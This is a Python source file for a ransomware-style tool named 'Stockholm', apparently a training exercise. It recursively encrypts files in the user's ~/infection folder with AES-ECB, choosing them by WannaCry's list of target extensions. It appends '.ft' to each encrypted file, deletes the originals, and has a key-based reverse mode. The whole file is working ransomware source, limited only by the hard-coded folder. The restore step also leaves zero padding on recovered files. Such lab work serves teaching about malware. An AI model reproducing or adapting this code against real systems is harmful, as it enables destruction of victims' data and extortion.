import sys
from pathlib import Path
from Crypto.Cipher import AES
import os

VERSION=0.1
FLAGS={
    "help": ['-h', '--help'],
    "version": ['-v', '--version'],
    "reverse": ['-r', '--reverse'],
    "silent": ['-s', '--silent'],
}

# Wannacry extension
INFECTED_EXTENSION = [
    ".der",".pfx",".key",".crt",".csr",".p12",".pem",".odt",".ott",".sxw",".stw",".uot",".3ds",".max",".3dm",".ods",".ots",".sxc",".stc",".dif",".slk",".wb2",".odp",".otp",".sxd",".std",".uop",".odg",".otg",".sxm",".mml",".lay",".lay6",".asc",".sqlite3",".sqlitedb",".sql",".accdb",".mdb",".db",".dbf",".odb",".frm",".myd",".myi",".ibd",".mdf",".ldf",".sln",".suo",".cs",".c",".cpp",".pas",".h",".asm",".js",".cmd",".bat",".ps1",".vbs",".vb",".pl",".dip",".dch",".sch",".brd",".jsp",".php",".asp",".rb",".java",".jar",".class",".sh",".mp3",".wav",".swf",".fla",".wmv",".mpg",".vob",".mpeg",".asf",".avi",".mov",".mp4",".3gp",".mkv",".3g2",".flv",".wma",".mid",".m3u",".m4u",".djvu",".svg",".ai",".psd",".nef",".tiff",".tif",".cgm",".raw",".gif",".png",".bmp",".jpg",".jpeg",".vcd",".iso",".backup",".zip",".rar",".7z",".gz",".tgz",".tar",".bak",".tbk",".bz2",".PAQ",".ARC",".aes",".gpg",".vmx",".vmdk",".vdi",".sldm",".sldx",".sti",".sxi",".602",".hwp",".snt",".onetoc2",".dwg",".pdf",".wk1",".wks",".123",".rtf",".csv",".txt",".vsdx",".vsd",".edb",".eml",".msg",".ost",".pst",".potm",".potx",".ppam",".ppsx",".ppsm",".pps",".pot",".pptm",".pptx",".ppt",".xltm",".xltx",".xlc",".xlm",".xlt",".xlw",".xlsb",".xlsm",".xlsx",".xls",".dotx",".dotm",".dot",".docm",".docb",".docx",".doc"
]

def show_version():
    print(f"{sys.argv[0]} version: {VERSION}")

def show_help():
    print(f"""
{", ".join(FLAGS['help'])}    display the help
{", ".join(FLAGS['version'])} show the version of the program
{", ".join(FLAGS['reverse'])} KEYFILE reverse the infection with the key entered as an argument
{", ".join(FLAGS['silent'])}  not show each encrypted ﬁle during the process
""")

class StockholmException(Exception):
    pass

class Stockholm():
    home: Path
    infection_dir: Path
    key: str | None
    reverse_key: str | None
    help: bool
    version: bool
    reverse: bool
    silent: bool

    def __init__(self, argv: list[str]):
        try:
            self.home = Path.home()
        except Exception as err:
            raise StockholmException(f"home environnement broken : {err}")
        self.reverse_key = None
        self.key = None
        self.help = False
        self.version = False
        self.reverse = False
        self.silent = False
        next_is_key: bool = False
        for arg in argv[1:]:
            if next_is_key:
                self.reverse_key = arg
                next_is_key = False
            elif arg in FLAGS['help']:
                self.help = True
            elif arg in FLAGS['version']:   
                self.version = True
            elif arg in FLAGS['reverse']:
                next_is_key = True
                self.reverse = True
            elif arg in FLAGS['silent']:
                self.silent = True
            elif self.key is None:
                if len(arg) < 16:
                    raise StockholmException(f"key < 16 character")
                self.key = arg
            else:
                raise StockholmException(f"flag not supported")
        if next_is_key:
            raise StockholmException(f"key need for reverse")
        if self.reverse_key is not None and self.key is not None:
            raise StockholmException(f"can't crypt and reverse")


    def restore_file(self, path: Path):
        data: bytes = b""
        new_path = path.parent / Path(path.stem)
        relative = path
        new_relative = new_path
        try:
            relative = path.relative_to(self.infection_dir)
        except Exception as err:
            pass
        try:
            new_relative = new_path.relative_to(self.infection_dir)
        except Exception as err:
            pass
        if not os.access(path, os.W_OK | os.R_OK):
            print(f"{relative} : Can't read or delete file after, so abort")
            return
        if new_path.exists():
            print(f"{new_relative} already exist")
            return
        try:
            with open(path, 'rb') as file:
                data = file.read()
        except Exception as err:
            print(f"{relative} : {err}")
            return
        cipher = AES.new(self.reverse_key[:32].encode(), mode=AES.MODE_ECB)
        data = data + b'\x00' * (16 - len(data) % 16)
        encrypt_data = cipher.decrypt(data)
        try:
            with open(new_path, 'w+b') as new_file:
                new_file.truncate(0)
                new_file.write(encrypt_data)
        except Exception as err:
            print(f"{new_relative} : {err}")
            return
        try:
            os.remove(path)
        except Exception as err:
            print(f"{relative} : {err}")
        if not self.silent:
            print(f"{relative} restore")

    def infect_file(self, path: Path):
        data: bytes = b""
        new_path = path.with_suffix(''.join(path.suffixes) + '.ft')
        relative = path
        new_relative = new_path
        try:
            relative = path.relative_to(self.infection_dir)
        except Exception as err:
            pass
        try:
            new_relative = new_path.relative_to(self.infection_dir)
        except Exception as err:
            pass
        if not os.access(path, os.W_OK | os.R_OK):
            print(f"{relative} : Can't read or delete file after, so abort")
            return
        if new_path.exists():
            print(f"{new_relative} already exist")
            return
        try:
            with open(path, 'rb') as file:
                data = file.read()
        except Exception as err:
            print(f"{relative} : {err}")
            return
        cipher = AES.new(self.key[:32].encode(), mode=AES.MODE_ECB)
        data = data + b'\x00' * (16 - len(data) % 16)
        encrypt_data = cipher.encrypt(data)
        try:
            with open(new_path, 'w+b') as new_file:
                new_file.truncate(0)
                new_file.write(encrypt_data)
        except Exception as err:
            print(f"{new_relative} : {err}")
            return
        try:
            os.remove(path)
        except Exception as err:
            print(f"{relative} : {err}")
        if not self.silent:
            print(f"{relative} infected")


    def restore_files(self, root: Path):
        paths: list[Path] = []
        try:
            paths = root.iterdir()
        except Exception as err:
            print (f"{paths} : {err}")
            return
        for child in paths:
            if child.is_dir():
                self.restore_files(child)
            elif child.is_file() and child.suffix == ".ft":
                try:
                    self.restore_file(child)
                except Exception as err:
                    print(f"{child} {err}")
    def infect_files(self, root: Path):
        paths: list[Path] = []
        try:
            paths = root.iterdir()
        except Exception as err:
            print (f"{paths} : {err}")
            return
        for child in paths:
            if child.is_dir():
                self.infect_files(child)
            elif child.is_file() and child.suffix != ".ft" and child.suffix in INFECTED_EXTENSION:
                self.infect_file(child)

    def run(self):
        if self.version:
            show_version()
        if self.help:
            show_help()
            return
        self.infection_dir = self.home / 'infection'
        if not self.infection_dir.exists(follow_symlinks=False):
            raise StockholmException(f"{self.infection_dir} : not exist or is a symlink")
        if not self.infection_dir.is_dir():
            raise StockholmException(f"{self.infection_dir} : not a dir")
        if self.key is not None:
            self.infect_files(self.infection_dir)
        if self.reverse_key is not None:
            self.restore_files(self.infection_dir)

def main():
    stockholm = Stockholm(sys.argv)
    stockholm.run()


if __name__ == '__main__':
    try:
        main()
    except StockholmException as err:
        print(f"Error: {err}")
        show_help()
